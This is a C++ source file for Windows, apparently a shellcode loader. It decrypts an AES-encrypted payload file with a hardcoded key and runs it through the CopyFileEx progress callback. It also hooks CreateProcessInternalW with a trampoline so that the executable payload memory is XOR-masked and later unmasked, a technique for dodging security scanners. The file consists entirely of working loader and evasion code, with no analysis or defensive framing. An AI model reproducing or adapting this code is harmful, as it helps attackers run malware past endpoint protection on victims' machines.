#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>

#include <stdio.h>
#include <string.h>
#include <Wincrypt.h>
#include <time.h>
#include <process.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")



using namespace std;


const char* extension = ".ramon";
#define AES_KEY_SIZE 16
#define CHUNK_SIZE (AES_KEY_SIZE*5)
char* encrypter_111(const char* path, BOOL isDecrypt, LPDWORD bytes, BOOL calculate) //std::string data)
{
	if (strlen(path) > MAX_PATH)
		return 0;
	char filename[266];
	char filename2[260 + 6];
	if (!isDecrypt)
	{

		strcpy_s(filename, 266, path);
		strcpy_s(filename2, 266, path);
		strcat_s(filename2, 266, extension);

	}
	else
	{
		strcpy_s(filename, 266, path);
	}



	wchar_t default_key[] = L"7fwivcli7r#auzS";
	wchar_t* key_str = default_key;

	size_t len = lstrlenW(key_str);


	HANDLE hInpFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInpFile == INVALID_HANDLE_VALUE) {
		printf("Cannot open input file!\n");
		system("pause");
		return 0;
	}

	/*HANDLE hOutFile = CreateFileA(filename2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE) {
		printf("Cannot open output file!\n");
		system("pause");
		return 0;
	}*/



	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;
	BYTE pbBuffer[32];

	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		dwStatus = GetLastError();
		printf("CryptAcquireContext failed: %x\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		system("pause");
		return 0;
	}



	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		dwStatus = GetLastError();
		printf("CryptCreateHash failed: %x\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		system("pause");
		return 0;
	}

	if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
		DWORD err = GetLastError();
		printf("CryptHashData Failed : %#x\n", err);
		system("pause");
		return 0;
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
		dwStatus = GetLastError();
		printf("CryptDeriveKey failed: %x\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		system("pause");
		return 0;
	}


	const size_t chunk_size = CHUNK_SIZE;
	BYTE chunk[chunk_size] = { 0 };
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInpFile, NULL);
	*bytes = inputSize;
	if (calculate == TRUE)
	{

		CryptReleaseContext(hProv, 0);
		CryptDestroyKey(hKey);
		CryptDestroyHash(hHash);
		//memset(random, '\0', 16);
		CloseHandle(hInpFile);
		/*if (!isDecrypt)
			CloseHandle(hOutFile);*/
		return 0;
	}

	char* kaka = (char*)malloc(inputSize + 1);
	if (!kaka)
		return 0;
	int i = 0;
	while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize == inputSize) {
			isFinal = TRUE;
		}

		if (isDecrypt) {
			if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
				printf("[-] CryptDecrypt failed error: 0x%x\n", GetLastError());
				break;
			}
		}
		else {
			if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
				printf("[-] CryptEncrypt failed\n");
				break;
			}
		}
		DWORD written = 0;

		if (i != 0)
			memcpy(kaka + 80 * i, chunk, out_len);
		else
		{
			memcpy(kaka, chunk, out_len);

		}
		i++;

		/*if (!isDecrypt)
		{
			if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
				printf("writing failed!\n");
				break;
			}
		}*/
		memset(chunk, 0, chunk_size);
	}
	*bytes = inputSize;
	CryptReleaseContext(hProv, 0);
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);
	//memset(random, '\0', 16);
	CloseHandle(hInpFile);
	/*if (!isDecrypt)
		CloseHandle(hOutFile);
	if (isDecrypt == FALSE)
	{
		HANDLE hInpFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
		CloseHandle(hInpFile);
	}*/


	return kaka;





}

typedef struct {
	char originalData[13];
	char jmp_addr[8];
} HOOK_RESULT, * PHOOK_RESULT, * LPHOOK_RESULT;


LPHOOK_RESULT res = new HOOK_RESULT;

typedef
BOOL(WINAPI* PCreateProcessA)(
	LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef
BOOL(WINAPI* PCreateProcessInternalW)(
	HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken
	);

typedef struct {
	LPBYTE signature;
	SIZE_T sigSize;
}SIGNATURE, * LPSIGNATURE, * PSIGNATURE;




typedef struct {
	PSIZE_T sigs;
	SIZE_T size;
}PATTERN_RESULT, * LPPATTERN_RESULT, * PPATTERN_RESULT;







/*
*	Says when a area in the specified process matches the signature.
*
*	@param  a HANDLE to the process.
*	@param  the baseAddress that the function will try to match.
*	@param  the mask of the pattern.
*	@param  a vector which contains the signature of the pattern.
*	@return TRUE if the signature of the pattern matches the BYTES in the area in the memory specified by the @param address.
*/





char tramp[13] = {
	0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
	0x41, 0xFF, 0xE2                                                    // jmp r10
};
char tramp_old[13];

BOOL restore_function(HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken)
{
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	PCreateProcessInternalW CreateProcessInternalW;
	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("kernelbase.dll"), "CreateProcessInternalW");

	DWORD written2,wt3;

	VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);
	VirtualProtect(tramp_old, sizeof tramp_old, PAGE_EXECUTE_READWRITE, &wt3);

	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
	if (!WriteProcessMemory(hProc, CreateProcessInternalW, &tramp_old, sizeof tramp_old, NULL))
	{
		printf("Error\n");
		return FALSE;
	}
	printf("New information after overwrite is: @%I64X\n", CreateProcessInternalW);
	CreateProcessInternalW(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation,
		hNewToken);
	return FALSE;
	
		


	return TRUE;
}
#define XOR_KEY "SAF341jlnvnjksd!$$%%$··";


BOOL WINAPI hook_CreateProcessA(
	HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken
)
{


	HANDLE hHeaps[250];
	const char* mask = "MZE";
	
	DWORD numHeaps = GetProcessHeaps(250, hHeaps);
	unsigned long i;
	MEMORY_BASIC_INFORMATION mbi;
	if (numHeaps <= 250)
	{
		for (i = 0; i < numHeaps; i++) {

			HeapLock(hHeaps[i]);
			
			PROCESS_HEAP_ENTRY entry;
			memset(&entry, '\0', sizeof entry);

			bool found = false;
			char* allocable;
			while (!found && HeapWalk(hHeaps[i], &entry) != FALSE)
			{
				for (auto ii = (__int64)entry.lpData; ii < (__int64)entry.lpData + entry.cbData; ii += 0x01) {

					if (!VirtualQueryEx(GetCurrentProcess(), (LPCVOID*)ii, &mbi, sizeof MEMORY_BASIC_INFORMATION))
						return 0;
					if (mbi.Protect == PAGE_EXECUTE_READWRITE)
					{
						if (strstr((char*)(ii), "MZE") != 0)
						{
							printf("Data: %s\n", (char*)ii);
							printf("Data dir: %p\n", ii);
							DWORD old;
							for (auto ij = ii; ij < (__int64)entry.lpData + entry.cbData; ij += 0x01)
							{
								*(char*)ij = *(char*)ij ^ '5';

							}
							if (strstr((char*)(ii), "MZE") != 0)
								printf("Failed XOR\n");
							restore_function(hToken,
								lpApplicationName,
								lpCommandLine,
								lpProcessAttributes,
								lpThreadAttributes,
								bInheritHandles,
								dwCreationFlags,
								lpEnvironment,
								lpCurrentDirectory,
								lpStartupInfo,
								lpProcessInformation,
								hNewToken);
							Sleep(7000);
							for (auto ij = ii; ij < (__int64)entry.lpData + entry.cbData; ij += 0x01)
							{
								*(char*)ij = *(char*)ij ^ '5';

							}
							//fwrite((char *)ii, (__int64)entry.lpData + entry.cbData, 1, fp);
							if (strstr((char*)(ii), "MZE") != 0)
								printf("Successfully decrypted XOR\n");
							HANDLE hLoad = LoadLibrary("kernel32.dll");
							HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
							PCreateProcessInternalW CreateProcessInternalW, CreateProcessInternalW2;
							CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
							DWORD written2;

							VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);
							DWORD old2;
							VirtualProtect(tramp, sizeof tramp, PAGE_EXECUTE_READWRITE, &old2);
							printf("Internal CreateProcess: %p", &CreateProcessInternalW);
							if (!WriteProcessMemory(hProc, (LPVOID*)CreateProcessInternalW, &tramp, sizeof tramp, NULL))
							{
								printf("Error\n");
								exit(-1);
							}
							

							return 1;
						}
					}

					ZeroMemory(&mbi, sizeof MEMORY_BASIC_INFORMATION);
				}
			}
			HeapUnlock(hHeaps[i]);
		}
	}
	printf("Size %d\n", lpStartupInfo->dwX);
	//VirtualAlloc()
	// 	   
	//if (!VirtualProtectEx(GetCurrentProcess(), Entry.lpData, Entry.cbData, PAGE_NOACCESS, &old))
		//printf("error 0x%X\n", GetLastError());
	
	return 1;
}

void null_function()
{
	printf("null1");
}


int main() {
	static DWORD size = NULL;
	HOOK_RESULT* res;
	encrypter_111("C:\\Users\\edr1\\Documents\\Openssl-dev\\terminator.raw.ramon", true, &size, true);
	char* lloc = (char*)malloc(size);
	memcpy(lloc, encrypter_111("C:\\Users\\edr1\\Documents\\Openssl-dev\\terminator.raw.ramon", true, &size, false), size);
	DWORD fold = NULL, old = NULL;



	HANDLE hLoad = LoadLibrary("kernel32.dll");
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	PCreateProcessInternalW CreateProcessInternalW, CreateProcessInternalW2;
	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
	
	DWORD written2;

	
	VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);

	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
	printf("Tramp : 0x%p\n", &tramp);
	puts("\n");
	void* shit = (void*)hook_CreateProcessA;
	memcpy(tramp_old, CreateProcessInternalW, sizeof tramp_old);
	memcpy(&tramp[2], &shit, sizeof(shit));
	printf("_hoot_trampoline@%I64X\n", hook_CreateProcessA);
	printf("Old pointer@%I64X\n", tramp_old);
	DWORD old2;
	VirtualProtect(tramp, sizeof tramp, PAGE_EXECUTE_READWRITE, &old2);
	printf("Internal CreateProcess: %p", &CreateProcessInternalW);
	if (!WriteProcessMemory(hProc, (LPVOID*)CreateProcessInternalW, &tramp, sizeof tramp, NULL))
	{
		printf("Error\n");
		exit(-1);
	}
	
	DWORD dold = NULL;
	if (!VirtualProtect(lloc, size, PAGE_EXECUTE_READWRITE, &dold))
		return 0;
	printf("Current process ID: %d\n", GetCurrentProcessId());
	if (!CopyFileEx("C:\\Users\\edr1\\Documents\\Openssl-dev\\terminator.raw.ramon", "terminator.raw.ramon", (LPPROGRESS_ROUTINE)lloc, NULL, FALSE, 0))
		printf("Error: %d\n", GetLastError());





}